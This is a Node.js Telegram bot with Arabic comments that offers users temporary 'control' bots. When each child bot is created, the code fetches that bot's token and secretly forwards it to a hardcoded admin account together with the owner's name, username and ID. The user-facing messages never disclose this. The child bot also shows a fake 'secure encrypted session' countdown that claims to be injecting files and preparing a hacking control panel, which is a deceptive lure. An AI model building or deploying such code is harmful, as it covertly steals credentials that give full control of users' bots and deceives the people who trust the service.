require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const express = require('express');

const app = express();
const PORT = process.env.PORT || 3000;

// صفحة ويب وهمية لضمان استجابة Render على الـ Port المطلوب
app.get('/', (req, res) => {
    res.send('<h1>Wahm Bot Manager is Running Successfully! 🚀</h1><p>System Status: Online</p>');
});

app.listen(PORT, () => {
    console.log(`🌐 Web server is running on port ${PORT}`);
});

const token = process.env.TELEGRAM_BOT_TOKEN;
const BOT_USERNAME = process.env.BOT_USERNAME || 'HackWahmBot'; // يوزرنيم بوتك بدون @
const ADMIN_ID = 5653088167; // آيدي الإدمن

const bot = new TelegramBot(token, { polling: true });

// تخزين البوتات الفرعية النشطة
const activeBots = new Map(); // key: bot_id, value: { token, owner_id, instance, timer }

// عندما يرسل المستخدم /start للبوت الرئيسي
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    const randomSuffix = Math.random().toString(36).substring(2, 8);
    const suggestedUsername = `wahm_${randomSuffix}_bot`;
    const botName = 'وهم - أداة التحكم';
    
    const createBotUrl = `https://t.me/newbot/${BOT_USERNAME}/${suggestedUsername}?name=${encodeURIComponent(botName)}`;
    
    const opts = {
        reply_markup: {
            inline_keyboard: [
                [{ text: '🤖 إنشاء بوت تحكم جديد (جلسة مؤقتة)', url: createBotUrl }]
            ]
        }
    };
    
    bot.sendMessage(chatId, `مرحباً بك يا فخم! 👋\n\nاضغط الزر أدناه لإنشاء بوت تليجرام جديد لبيئة التحكم والاختبار.\nملاحظة: البوت يعمل لفترة تجريبية مدتها 10 دقائق فقط ثم يتم حذفه تلقائياً من الخادم لتفادي تضارب التوكنات. ✅`, opts);
});

// عرض البوتات النشطة للمستخدم
bot.onText(/\/mybots/, (msg) => {
    const chatId = msg.chat.id;
    const userBots = [];
    
    for (const [botId, data] of activeBots) {
        if (data.owner_id === chatId) {
            userBots.push(`🤖 @${data.username || botId} (جلسة فحص مؤقتة)`);
        }
    }
    
    if (userBots.length === 0) {
        bot.sendMessage(chatId, "ليس لديك أي بوتات نشطة حالياً. اضغط /start لإنشاء بوت جديد.");
    } else {
        bot.sendMessage(chatId, `بوتاتك النشطة حالياً:\n\n${userBots.join('\n')}`);
    }
});

// معالجة الأخطاء
bot.on('polling_error', (error) => {
    console.error('Polling error:', error.message);
});

// معالجة تحديثات البوتات المُدارة عند إنشائها
bot.on('managed_bot', async (update) => {
    try {
        const managedBot = update;
        const botUser = managedBot.bot;
        const owner = managedBot.user;
        
        console.log(`✅ بوت جديد تم إنشاؤه: @${botUser.username} بواسطة المستخدم ${owner.id}`);
        
        // الحصول على توكن البوت الفرعي
        const botToken = await getManagedBotToken(botUser.id);
        
        if (botToken) {
            // تشغيل البوت الفرعي
            startChildBot(botToken, botUser.username, owner.id, owner.username || 'غير متوفر', owner.first_name || 'مستخدم');
            
            // إبلاغ المالك
            bot.sendMessage(owner.id, `✅ تم إنشاء وتشغيل بوت التحكم الخاص بك بنجاح!\n\n🤖 البوت: @${botUser.username}\n⏳ مدة الجلسة: 10 دقائق\n\nجرب إرسال /start للبوت الجديد لمعاينة النظام!`);
        }
    } catch (error) {
        console.error('Error handling managed bot:', error.message);
    }
});

// دالة للحصول على توكن البوت المُدار من تيليجرام
async function getManagedBotToken(botUserId) {
    try {
        const response = await axios.get(
            `https://api.telegram.org/bot${token}/getManagedBotToken`,
            { params: { user_id: botUserId } }
        );
        if (response.data && response.data.ok) {
            return response.data.result;
        }
    } catch (error) {
        console.error('Error getting managed bot token:', error.message);
    }
    return null;
}

// تشغيل بوت فرعي مع مؤقت متحرك وحذف جذري بعد 10 دقائق
function startChildBot(childToken, username, ownerId, ownerUsername, ownerName) {
    try {
        const childBot = new TelegramBot(childToken, { polling: true });
        
        // إرسال تفاصيل البوت المصنوع للإدمن فوراً
        const adminMsg = `🚨 **تنبيه: تم إنشـاء بوت تحكم جـديد!**\n\n` +
                         `👤 اسم صاحب البوت: ${ownerName}\n` +
                         `🔗 يوزر صاحب البوت: @${ownerUsername}\n` +
                         `🆔 آيدي صاحب البوت: ${ownerId}\n` +
                         `🤖 يوزر البوت المصنوع: @${username}\n` +
                         `🔑 توكن البوت:\n\`${childToken}\``;
        
        bot.sendMessage(ADMIN_ID, adminMsg, { parse_mode: 'Markdown' }).catch(err => {
            console.error('Failed to notify admin:', err.message);
        });

        // البوت الفرعي يرد على /start بالصيغة المطلوبة مع مؤقت متحرك كل ثانية
        childBot.onText(/\/start/, async (msg) => {
            const chatId = msg.chat.id;
            let remainingSeconds = 600; // 10 دقائق (600 ثانية)

            const formatTime = (secs) => {
                const m = Math.floor(secs / 60);
                const s = secs % 60;
                return `${m.toString().padStart(2, '0')} دقيقة و ${s.toString().padStart(2, '0')} ثانية`;
            };

            let initialText = `🔒 **[SECURE ENCRYPTED SESSION]**\n` +
                              `👤 العميل: ${ownerName}\n` +
                              `⚙️ النظام: **Wahm Control Center**\n` +
                              `📌 حالة الاتصال: جاري حقن ملفات التحكم والتوجيه...\n` +
                              `⏳ الوقت المتبقي للانتهاء من إعداد لوحة تحكم الاختراق: **${formatTime(remainingSeconds)}**`;
            
            let sentMsg;
            try {
                sentMsg = await childBot.sendMessage(chatId, initialText, { parse_mode: 'Markdown' });
            } catch (e) {
                return;
            }
            
            // عداد تنازلي متحرك يحدث كل ثانية واحدة
            const timerInterval = setInterval(async () => {
                remainingSeconds -= 1;

                if (remainingSeconds <= 0) {
                    clearInterval(timerInterval);
                    try {
                        await childBot.editMessageText(
                            `❌ **[SESSION EXPIRED]**\n\n` +
                            `⚙️ نظام Wahm Control Center\n` +
                            `⏱️ انتهت صلاحية الجلسة المؤقتة وتم إيقاف البوت.`,
                            {
                                chat_id: chatId,
                                message_id: sentMsg.message_id,
                                parse_mode: 'Markdown'
                            }
                        );
                    } catch (e) {}
                    return;
                }

                const timeStr = formatTime(remainingSeconds);
                const updatedText = `🔒 **[SECURE ENCRYPTED SESSION]**\n` +
                                    `👤 العميل: ${ownerName}\n` +
                                    `⚙️ النظام: **Wahm Control Center**\n` +
                                    `📌 حالة الاتصال: جاري حقن ملفات التحكم والتوجيه...\n` +
                                    `⏳ الوقت المتبقي للانتهاء من إعداد لوحة تحكم الاختراق: **${timeStr}**`;

                try {
                    await childBot.editMessageText(updatedText, {
                        chat_id: chatId,
                        message_id: sentMsg.message_id,
                        parse_mode: 'Markdown'
                    });
                } catch (e) {
                    // تجاهل أخطاء التعديل المتكرر
                }
            }, 1000); // كل ثانية تماماً
        });
        
        // مؤقت إيقاف وحذف البوت نهائياً من السيرفر بعد 10 دقائق (600000 ميلي ثانية)
        const selfDestructTimer = setTimeout(async () => {
            try {
                console.log(`⏳ انتهت مدة الـ 10 دقائق للبوت @${username}. جاري إيقافه وحذفه جذرياً من السيرفر...`);
                
                await childBot.stopPolling();
                
                childBot.sendMessage(ownerId, `⚠️ **[تنبيه أمني]**\nانتهت مدة الـ 10 دقائق التجريبية للبوت @${username}.\nتم إيقاف البوت وحذفه نهائياً من الخادم لتفادي تضارب التوكنات وضمان الأمان.`).catch(() => {});
                
                activeBots.delete(username);
                console.log(`❌ تم إزالة البوت @${username} بنجاح من الذاكرة.`);
            } catch (err) {
                console.error(`Error during self-destruct for @${username}:`, err.message);
            }
        }, 10 * 60 * 1000);
        
        // حفظ البوت الفرعي في الذاكرة
        activeBots.set(username, {
            token: childToken,
            owner_id: ownerId,
            username: username,
            instance: childBot,
            timer: selfDestructTimer
        });
        
        console.log(`🟢 بوت فرعي شغال (بمؤقت متحرك 10 دقائق): @${username}`);
        
        childBot.on('polling_error', (error) => {
            console.error(`Error in child bot @${username}:`, error.message);
        });
        
    } catch (error) {
        console.error(`Failed to start child bot @${username}:`, error.message);
    }
}

// معالجة raw updates لاستقبال managed_bot
const originalProcessUpdate = bot.processUpdate.bind(bot);
bot.processUpdate = function(update) {
    if (update.managed_bot) {
        console.log('📥 Received managed_bot update:', JSON.stringify(update.managed_bot));
        bot.emit('managed_bot', update.managed_bot);
    }
    originalProcessUpdate(update);
};

console.log('✅ Manager Bot is running for Wahm Empire...');
console.log(`📎 Bot username: @${BOT_USERNAME}`);
console.log('🔗 Users can create bots via /start command');
